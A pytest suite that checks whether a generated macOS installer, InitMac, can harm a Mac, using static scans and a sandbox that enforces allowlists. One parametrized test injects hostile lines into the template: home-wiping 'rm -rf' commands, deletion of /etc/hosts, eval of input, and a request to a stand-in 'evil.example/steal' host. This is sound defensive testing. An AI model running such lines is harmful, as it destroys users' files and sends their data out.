"""Proves the generated installer can't harm a Mac.

Two layers:
1. Static: scan the installer's source for dangerous calls and unexpected URLs.
2. Behavioural: run the real generated script with EVERY app, tweak and option enabled
   (plus sync / forget / restore), with HOME, Homebrew, subprocess and the network faked,
   and check every command it runs, every file it writes and every request it makes
   against an allowlist.
"""

import ast
import io
import json
import os
import platform
import re
import subprocess
import sys
import types
from pathlib import Path

import pytest

from catalog.validate import load_all
from installer.render import TEMPLATE, render_installer, render_launcher
from safety import ALLOWED_URL_PREFIXES, static_violations  # noqa: F401

SERVER = "https://initmac.test"

ALLOWED_COMMANDS = {"brew", "git", "ssh-keygen", "ssh-add", "defaults", "killall", "xcode-select", "pbcopy", "gh", "bash"}
ALLOWED_BREW_SUBCOMMANDS = {"list", "leaves", "info", "update", "tap", "install"}
ALLOWED_KILLALL = {"Dock", "Finder", "SystemUIServer"}
ALLOWED_DEFAULTS_DOMAINS = {
    "com.apple.dock", "NSGlobalDomain", "com.apple.finder", "com.apple.screencapture",
    "com.apple.AppleMultitouchTrackpad", "com.apple.driver.AppleBluetoothMultitouch.trackpad",
}
ALLOWED_TAPS = {"hashicorp/tap"}
# Everything the installer may create under $HOME (regexes on the relative path).
ALLOWED_HOME_PATHS = [
    r"\.zprofile", r"\.ssh", r"\.ssh/config",
    r"mac-setup-logs", r"mac-setup-logs/install-[\d-]+\.log",
    r"mac-setup-defaults-backup\.json",
    r"Pictures", r"Pictures/Screenshots",
    r"\.initmac", r"\.initmac/device\.json",
]

def test_template_has_no_dangerous_calls():
    assert static_violations(TEMPLATE.read_text()) == []


@pytest.mark.parametrize("evil", [
    'os.remove("/Users/me/Documents")',
    'shutil.rmtree(HOME)',
    'subprocess.run("rm -rf ~", shell=True)',
    'subprocess.run(["sudo", "rm", "-rf", "/"])',
    'eval(input())',
    'Path("/etc/hosts").unlink()',
    'urllib.request.urlopen("https://evil.example/steal")',
])
def test_static_check_catches_injected_danger(evil):
    """Proves the checker works: injecting a harmful line into the template is caught."""
    source = TEMPLATE.read_text().replace("def main():", f"def _evil():\n    {evil}\n\n\ndef main():", 1)
    assert static_violations(source), f"not caught: {evil}"


def test_launcher_only_downloads_verifies_and_runs():
    sh = render_launcher("https://initmac.in/i/abc", "b" * 64)
    assert "sudo" not in sh
    rm_lines = [l for l in sh.splitlines() if re.search(r"\brm\b", l)]
    assert rm_lines == ["trap 'rm -f \"$script\"' EXIT"]  # only its own temp file
    code = "\n".join(l for l in sh.splitlines() if not l.lstrip().startswith("#"))
    assert re.findall(r"https?://\S+", code) == ["https://initmac.in/i/abc"]
    assert sh.index('if [ "$actual" != "$expected" ]') < sh.index('/usr/bin/python3 "$script"')


@pytest.mark.skipif(platform.system() != "Darwin", reason="needs macOS shasum/xcode-select")
@pytest.mark.parametrize("tamper", [False, True])
def test_launcher_refuses_tampered_script(tmp_path, tamper):
    script = tmp_path / "install.py"
    script.write_text('print("INSTALLER RAN")\n')
    import hashlib
    digest = hashlib.sha256(script.read_bytes()).hexdigest()
    if tamper:
        script.write_text('print("INSTALLER RAN")\nprint("evil")\n')
    launcher = tmp_path / "run.sh"
    launcher.write_text(render_launcher(f"file://{script}", digest))
    out = subprocess.run(["bash", str(launcher)], capture_output=True, text=True, timeout=60)
    if tamper:
        assert out.returncode == 1 and "INSTALLER RAN" not in out.stdout
        assert "doesn't match its fingerprint" in out.stderr
    else:
        assert out.returncode == 0 and "INSTALLER RAN" in out.stdout


# ---------------------------------------------------------- behavioural sandbox
class Sandbox:
    """Runs the generated installer with fakes and records everything it does."""

    def __init__(self, tmp_path, monkeypatch):
        self.home = tmp_path / "home"
        self.home.mkdir()
        self.tmp = tmp_path / "tmp"
        self.tmp.mkdir()
        brew_prefix = tmp_path / "homebrew"
        (brew_prefix / "bin").mkdir(parents=True)
        (brew_prefix / "bin" / "brew").write_text("#!/bin/sh\n")
        monkeypatch.setenv("HOME", str(self.home))
        monkeypatch.setenv("TMPDIR", str(self.tmp))
        monkeypatch.setenv("PATH", "/usr/bin:/bin")
        import tempfile
        monkeypatch.setattr(tempfile, "tempdir", None)

        self.commands: list[list[str]] = []
        self.requests: list[tuple[str, str, dict | None]] = []

        apps, _, tweaks = load_all()
        everything = {
            "apps": [a["id"] for a in apps],
            "git": {"enabled": True, "name": "Ada", "email": "ada@example.com", "ssh_key": True},
            "defaults": [t["id"] for t in tweaks],
            "created_at": "2026-10-02T10:00:00+00:00",
        }
        source = render_installer(everything, "sel123", server=SERVER)
        self.mod = types.ModuleType("initmac_installer")
        exec(compile(source, "install.py", "exec"), self.mod.__dict__)
        self.mod.BREW_PREFIXES = [str(brew_prefix)]
        # A fake /Applications with Chrome already there, as if downloaded from google.com.
        self.applications = tmp_path / "Applications"
        (self.applications / "Google Chrome.app").mkdir(parents=True)
        self.mod.APPLICATION_DIRS = [self.applications]
        self.mod.subprocess = self._fake_subprocess()
        monkeypatch.setattr(self.mod.urllib.request, "urlopen", self._fake_urlopen)
        monkeypatch.setattr(self.mod.shutil, "which", lambda name: f"/usr/bin/{name}")

    def _fake_subprocess(self):
        record = self.commands.append
        installed = {"git", "slack"}  # what the fake Homebrew reports as installed

        class Popen:
            def __init__(self, cmd, **kw):
                record(list(cmd))
                if cmd[1:2] == ["install"]:  # remember installs, like real Homebrew
                    installed.update(a.split("/")[-1] for a in cmd[2:] if not a.startswith("--"))
                self.stdout = iter([])

            def wait(self):
                return 0

        def call(cmd, **kw):
            record(list(cmd))
            return 0

        def run(cmd, **kw):
            record(list(cmd))
            out = "\n".join(sorted(installed)) if cmd[-2:] in (["--formula", "-1"], ["--cask", "-1"]) else ""
            if cmd[1:4] == ["info", "--json=v2", "--cask"]:
                out = json.dumps({"casks": [
                    {"token": t, "artifacts": [{"app": [t.replace("-", " ").title() + ".app"]}]} for t in cmd[4:]
                ]})
            return types.SimpleNamespace(stdout=out, returncode=1 if cmd[:2] == ["defaults", "read"] else 0)

        return types.SimpleNamespace(Popen=Popen, call=call, run=run, PIPE=-1, STDOUT=-2, DEVNULL=-3)

    def _fake_urlopen(self, req, timeout=None):
        body = json.loads(req.data) if req.data else None
        self.requests.append((req.get_method(), req.full_url, body))
        reply = {"id": "dev123", "secret": "s3cret", "url": f"{SERVER}/m/dev123"} if req.get_method() == "POST" else {"ok": True}
        resp = io.BytesIO(json.dumps(reply).encode())
        resp.__enter__ = lambda *a: resp
        resp.__exit__ = lambda *a: None
        return resp

    def run(self, *args):
        sys_argv = sys.argv
        sys.argv = ["install.py", *args]
        try:
            self.mod.main()
        except SystemExit:
            pass
        finally:
            sys.argv = sys_argv

    def files_under_home(self):
        return sorted(str(p.relative_to(self.home)) for p in self.home.rglob("*"))


@pytest.fixture
def sandbox(tmp_path, monkeypatch):
    return Sandbox(tmp_path, monkeypatch)


def assert_commands_allowed(commands):
    assert commands, "sandbox recorded no commands"
    for cmd in commands:
        exe = os.path.basename(cmd[0])
        joined = " ".join(cmd)
        assert exe in ALLOWED_COMMANDS, f"unexpected command: {joined}"
        assert "sudo" not in cmd and not re.search(r"(^| )rm( |$)", joined), joined
        if exe == "brew":
            assert cmd[1] in ALLOWED_BREW_SUBCOMMANDS, joined
            if cmd[1] == "tap" and len(cmd) > 2:  # bare `brew tap` just lists taps
                assert cmd[2] in ALLOWED_TAPS, joined
        if exe == "killall":
            assert cmd[1:] and set(cmd[1:]) <= ALLOWED_KILLALL, joined
        if exe == "defaults":
            assert cmd[1] in ("read", "write", "delete") and cmd[2] in ALLOWED_DEFAULTS_DOMAINS, joined
        if exe == "bash":
            assert "raw.githubusercontent.com/Homebrew/install" in joined, joined
        if exe == "git":
            assert cmd[1:3] == ["config", "--global"], joined


def assert_home_files_allowed(files):
    for rel in files:
        assert any(re.fullmatch(p, rel) for p in ALLOWED_HOME_PATHS), f"unexpected file written: ~/{rel}"


def test_full_install_only_does_allowed_things(sandbox):
    sandbox.run("--yes")
    assert_commands_allowed(sandbox.commands)
    assert_home_files_allowed(sandbox.files_under_home())
    assert sandbox.requests == []  # no network without opting in to sync
    installed = [c for c in sandbox.commands if c[1:2] == ["install"]]
    assert installed, "expected brew install calls"
    # Nothing is tapped in the sandbox, so the trusted third-party tap is added before installing.
    taps = [c[2] for c in sandbox.commands if c[1:2] == ["tap"] and len(c) > 2]
    assert taps == ["hashicorp/tap"]


def test_dry_run_changes_nothing(sandbox):
    sandbox.run("--dry-run", "--yes")
    def is_read(c):
        exe = os.path.basename(c[0])
        return (
            (exe == "brew" and (c[1] in ("list", "info") or c == [c[0], "tap"]))
            or c[:2] in (["defaults", "read"], ["xcode-select", "-p"])
            or (exe == "git" and len(c) == 4)  # `git config --global user.name` reads the value
        )

    mutating = [c for c in sandbox.commands if not is_read(c)]
    assert mutating == []
    assert [f for f in sandbox.files_under_home() if not f.startswith("mac-setup-logs")] == []
    assert sandbox.requests == []


def test_sync_sends_only_name_and_package_names(sandbox):
    sandbox.run("--sync", "--yes")
    assert [(m, u) for m, u, _ in sandbox.requests] == [
        ("POST", f"{SERVER}/api/devices"),
        ("PUT", f"{SERVER}/api/devices/dev123"),
    ]
    body = sandbox.requests[1][2]
    assert set(body) == {"name", "formulae", "casks"} and body["name"] == "My Mac"
    device_file = sandbox.home / ".initmac" / "device.json"
    assert oct(device_file.stat().st_mode & 0o777) == "0o600"
    assert_home_files_allowed(sandbox.files_under_home())

    sandbox.run("--forget-device", "--yes")
    assert sandbox.requests[-1][:2] == ("DELETE", f"{SERVER}/api/devices/dev123")
    assert not device_file.exists()


def test_restore_defaults_only_touches_defaults(sandbox):
    sandbox.run("--yes")
    sandbox.commands.clear()
    sandbox.run("--restore-defaults", "--yes")
    assert_commands_allowed(sandbox.commands)
    assert {os.path.basename(c[0]) for c in sandbox.commands} <= {"defaults", "killall"}
    assert not (sandbox.home / "mac-setup-defaults-backup.json").exists()


def test_plan_lists_every_change_and_the_promises(sandbox, capsys):
    sandbox.run("--dry-run", "--yes")
    out = capsys.readouterr().out
    assert "Here's what InitMac will do" in out
    assert "It will NOT:" in out and "Delete or overwrite any of your files" in out
    assert "Change 9 macOS settings" in out
    assert "star on GitHub" not in out  # never on a dry run


def test_star_request_only_after_a_successful_install(sandbox, capsys):
    sandbox.run("--yes")
    out = capsys.readouterr().out
    assert out.count("A star on GitHub helps others find it") == 1


def test_apps_installed_outside_homebrew_are_left_alone(sandbox, capsys):
    sandbox.run("--yes")
    out = capsys.readouterr().out
    installs = [arg for c in sandbox.commands if c[1:2] == ["install"] for arg in c[2:]]
    assert "google-chrome" not in installs
    assert "visual-studio-code" in installs  # not present, so it does get installed
    assert "already installed: Google Chrome (installed outside Homebrew (Google Chrome.app))" in out
    assert "Skip 3 apps you already have: Git, Slack, Google Chrome" in out
    assert (sandbox.applications / "Google Chrome.app").is_dir()  # untouched
